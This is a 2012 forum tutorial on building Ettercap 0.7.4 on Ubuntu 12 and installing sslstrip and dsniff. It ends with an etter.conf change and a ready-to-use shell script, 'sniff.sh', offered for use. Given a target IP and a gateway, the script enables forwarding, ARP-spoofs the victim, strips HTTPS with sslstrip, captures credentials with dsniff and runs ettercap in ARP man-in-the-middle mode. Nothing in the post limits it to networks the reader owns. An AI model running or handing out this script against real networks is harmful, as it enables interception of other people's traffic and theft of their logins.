---
title: "Ubuntu 12 - Ettercap 0.7.4 (compilation) + sslstrip + dsniff +configuration Tutorial"
date: 2012-05-15
forum: General Help
---

### Post by Illubaba on 2012-05-15
Hi guys

I just spent about a day compiling the new ettercap, installing sslstrip and dsniff in Ubuntu 12. Because this was in no way easy especially the compiling ettercap part I decided to write a tutorial for everyone and share how to do this. Heres what we'll do.

1. Compile ettercap 0.7.4
2. Installing sslstrip, dsniff
3. Configure everything for a successfull mitm
--> etter.conf ...


1. How to compile Ettercap 0.7.4
Thanks to some guys post on this forum - [http://ubuntuforums.org/showthread.php?t=1943365](http://ubuntuforums.org/showthread.php?t=1943365) - i was able to compile ettercap on Ubuntu 12. Be sure to follow it EXACTLY step by step or you'll fail. Believe me I've tried :)

> 
Part 1.

sudo apt-get install build-essential
sudo apt-get install linux-headers-`uname -r`

Part 2. Installing the Libraries

sudo apt-get install libpcre3-dev
sudo apt-get install libpcap0.8-dev
sudo apt-get install libnet1-dev
sudo apt-get install openssl
sudo apt-get install libssl-dev
sudo apt-get install ncurses-bin
sudo apt-get install libncurses5-dev
sudo apt-get install libnet6-1.3-dev
sudo apt-get install libpthread-stubs0-dev
sudo apt-get install zlib1g-dev
sudo apt-get install libltdl-dev
sudo apt-get install pango-graphite
sudo apt-get install pkg-config
sudo apt-get install libpango1.0-dev
sudo apt-get install libatk1.0-dev
sudo apt-get install libgtk2.0-dev

Part 3. Extras

sudo apt-get install autoconf
sudo apt-get install byacc

Part 4. The patch

[https://docs.google.com/file/d/0B5pF...mZmE0Mjdl/edit](https://docs.google.com/file/d/0B5pF...mZmE0Mjdl/edit)

(to download when you open the page go to up left corner, click on File and then Download.)

I downloaded it into ettercap main dir. So if you haven't - you should now copy the patch file in the ettercap main directory.

Part 5. Apply the patch

My ettercap folder is/was on my Desktop so when I opened a terminal I navigate to my desktop.
Get into ettercap folder.

Type in terminal:

patch -p1 < ettercap-0.7.4-autotools.patch

Part 6.

After the patching is done type we can continue with this:

./autogen.sh

In the terminal window you should see something like this:

libtoolize: copying file `libltdl/lt_dlloader.c'
libtoolize: copying file `libltdl/lt_error.c'
libtoolize: copying file `libltdl/ltdl.c'
libtoolize: copying file `libltdl/ltdl.h'
libtoolize: copying file `libltdl/slist.c'
libtoolize: Remember to add `LT_CONFIG_LTDL_DIR([libltdl])' to `configure.in'.
libtoolize: Consider using `AC_CONFIG_AUX_DIR([libltdl/config])' in configure.in.
libtoolize: Consider using `AC_CONFIG_MACRO_DIR([libltdl/m4])' in configure.in.
libtoolize: Consider adding `-I m4' to ACLOCAL_AMFLAGS in Makefile.am.
running aclocal
running autoheader
running autoconf
running automake


Part 7. Configure

In the guide it was shown this:

./configure --enable-plugins --enable-debug

I used this:

./configure --enable-plugins --enable-debug --enable-gtk

With these settings the install dir will be : /usr/local

When the configuration is done you will see this or something like this :

Libraries :

LIBPCAP ................ default
LIBNET ................. default
LIBSSL ................. default
NCURSES ................ default
GTK+ ................... yes

Functionalities :

Debug mode ............. yes
Plugin support ......... yes
Passive DNS ............ yes
Perl regex in filters .. yes
Iconv UTF-8 support .... yes

Part 8. Fixing a line

So this was the most important part for me. As I wanted to have GTK (graphic interface) i had a problem where the making of the install was unable to read something so i was unable to install Ettercap with GTK.

Here is the salvation.

In terminal considering you are into Ettercap main directory, type this:

cd src/
sudo gedit Makefile

so the text redactor will appear and you will need to find this line:

LIBS = -lresolv -lz -lpthread -lltdl -ldl -ldl

using the search function for example and change it with this:

LIBS = -lresolv -lz -lpthread -lltdl -ldl -ldl -lpcap -lnet -lssl -lcrypto -lpcre -lpanel -lmenu -lform -lncurses -pthread -lgtk-x11-2.0 -lgdk-x11-2.0 -lgio-2.0 -lpangoft2-1.0 -lpangocairo-1.0 -lgdk_pixbuf-2.0 -lcairo -lfreetype -lfontconfig -lpango-1.0 -lgmodule-2.0 -latk-1.0 -lgobject-2.0 -lgthread-2.0 -lrt -lglib-2.0 -lgthread-2.0

and then save the file.

NOTE: you can use your favorite text redactor for sure but the point here is using the sudo command to open it because the Makefile is locked for non-sudo usage.

Part 9. The ef_syntax.c file

If by some reasons you are missing "ef_syntax.c" file into "utils/etterfilter/" you can download it from here : [https://docs.google.com/file/d/0B5pF...1MTk0NzYw/edit](https://docs.google.com/file/d/0B5pF...1MTk0NzYw/edit)
and put it in the place.

Part 10. "make" and "make install"

Now in terminal navigate to the Ettercap directory and type following commands:

make

If you don't get any errors till the end of "making" (as it should be), type the next command into the terminal:

sudo make install

after finishing you should have working Ettercap with GTK!

type in terminal: ettercap -G


2. install dsniff, sslstrip
If you've made it to this part and successfully compiled ettercap the hard part is over. Let's do the easy stuff:
sudo apt-get -y install sslstrip dsniff

3. Configure everything for a successfull mitm
3.1 Editing the etter.conf
open up /usr/local/etc/etter.conf (/etc/etterc.conf for the old ettercap) in your favourite text editor.

Search for the following lines and uncomment them

Before:
#ec_uid = 0                # nobody is the default
#ec_gid = 0                # nobody is the default

After:
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default

And here's some nice to know (skip if you're not interested):
You'll probably read on many forums that you should uncomment the following lines in the etter.conf for various reasons:

# if you use iptables:
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

In fact those 2 lines only need to be uncommented if you want ettercap to use fake SSL-Certificates. Since we use sslstrip we will not need fake SSL-Certificates and hence do not uncomment those lines. If that does not make sense to you go to the sslstrip official page and read what it does.

In case you will need fake ssl certificates for some reason uncomment those lines but turn off sslstrip.

3.2 Dsniff, arpspoof
So the only ones left are dsniff and arpspoof. Well you're lucky. I wrote a very simple Shellscript which does the rest of the work. 

Usage: sniff.sh <targetIP> <gateway>

```

#!/bin/bash

echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
arpspoof -i wlan0 $2 $1
xterm -geometry 80x10+900+2 -e 'dsniff -i wlan0' &
xterm -geometry 80x10+900+180 -e 'sslstrip -a -l 10000 wlan0' &
ettercap -m ettercap.log -T -Q -M arp:remote -i wlan0 /$2/ /$1/

```

I know the script is far from perfect or anything but you can use it as a template to build your own. This should get you the idea. Feel free to edit the script and post it here.

Maybe this will be useful to someone out there.

Happy Hacking

---

